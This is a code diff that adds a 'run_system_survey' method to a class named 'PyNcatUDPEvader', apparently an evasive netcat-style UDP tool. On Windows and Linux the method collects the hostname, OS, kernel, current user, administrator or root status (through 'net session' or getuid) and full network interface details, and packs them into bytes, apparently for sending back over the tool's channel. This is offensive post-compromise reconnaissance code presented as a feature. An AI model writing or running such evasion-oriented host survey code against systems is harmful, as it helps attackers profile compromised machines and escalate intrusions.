@@ -179,6 +179,60 @@ class PyNcatUDPEvader:
         
         return parser.parse_args()
 
+
+    def run_system_survey(self) -> bytes:
+        """
+        Executes an automated, multi-platform system discovery profile.
+        Gathers core OS details, active user privileges, and interface maps.
+        """
+        import platform
+        import getpass
+        
+        survey_results = []
+        survey_results.append("=== HOST SYSTEM SURVEY DATA ===")
+        survey_results.append(f"Timestamp : {time.strftime('%Y-%m-%d %H:%M:%S')}")
+        survey_results.append(f"Hostname  : {platform.node()}")
+        survey_results.append(f"OS Type   : {platform.system()} ({platform.release()})")
+        survey_results.append(f"Kernel    : {platform.version()}")
+        survey_results.append(f"User Context: {getpass.getuser()}")
+        
+        # Determine specific platform discovery strings
+        if platform.system().lower() == "windows":
+            # Check for administrative tokens via native group checks
+            try:
+                priv_check = subprocess.check_output("net session", shell=True, stderr=subprocess.STDOUT)
+                survey_results.append("Privileges: High (Administrative Token Present)")
+            except subprocess.CalledProcessError:
+                survey_results.append("Privileges: Standard User Context")
+                
+            # Gather networking maps natively via ipconfig
+            try:
+                net_map = subprocess.check_output("ipconfig /all", shell=True).decode('utf-8', errors='replace')
+                survey_results.append("\n--- NETWORK INTERFACE LAYOUT ---\n" + net_map)
+            except Exception as e:
+                survey_results.append(f"[-] Interface retrieval failed: {e}")
+                
+        else:
+            # Check for Linux root privileges via effective User ID
+            if os.getuid() == 0:
+                survey_results.append("Privileges: High (root context active)")
+            else:
+                survey_results.append("Privileges: Standard User Context")
+                
+            # Gather Linux networking maps natively via ip address or ifconfig fallback
+            try:
+                net_map = subprocess.check_output("ip address show || ifconfig", shell=True).decode('utf-8', errors='replace')
+                survey_results.append("\n--- NETWORK INTERFACE LAYOUT ---\n" + net_map)
+            except Exception as e:
+                survey_results.append(f"[-] Interface retrieval failed: {e}")
+                
+        survey_results.append("===============================\n")
+        
+        # Consolidate strings back into a unified byte stream
+        return "\n".join(survey_results).encode('utf-8')
+
+    
+
     def _apply_sleep(self, base_delay: float):
         if base_delay <= 0:
             return
